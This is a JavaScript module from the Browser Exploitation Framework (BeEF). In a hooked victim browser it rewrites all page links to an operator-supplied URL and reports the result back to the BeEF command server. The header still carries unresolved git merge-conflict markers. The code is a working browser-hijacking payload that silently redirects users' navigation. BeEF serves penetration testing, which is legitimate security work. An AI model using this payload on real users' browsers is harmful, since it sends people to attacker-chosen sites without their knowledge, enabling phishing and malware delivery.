//
<<<<<<< HEAD
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinks('<%= @url %>')+' links rewritten to <%= @url %>');
});

